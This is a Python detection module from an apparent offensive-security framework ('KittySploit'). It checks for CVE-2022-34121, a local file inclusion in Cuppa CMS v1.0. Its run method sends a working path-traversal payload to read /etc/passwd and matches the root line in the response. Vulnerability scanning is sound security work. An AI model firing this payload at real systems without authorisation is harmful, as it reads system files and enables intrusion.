#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Cuppa CMS v1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'CuppaCMS v1.0 - Local File Inclusion Detection',
        'description': 'Cuppa CMS v1.0 is vulnerable to local file inclusion via the component /templates/default/html/windows/right.php.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'lfi', 'cuppa', 'cms', 'cuppacms', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/hansmach1ne/MyExploits/tree/main/LFI_in_CuppaCMS_templates',
            'https://github.com/CuppaCMS/CuppaCMS/issues/18',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-34121',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2022-34121',
    }

    def run(self):
        path = '/templates/default/html/windows/right.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='url=../../../../../../../../../../../../etc/passwd\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:[x*]:0:0',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='high', reason='CuppaCMS v1.0 - Local File Inclusion detected', path=path)
            return True
        return False

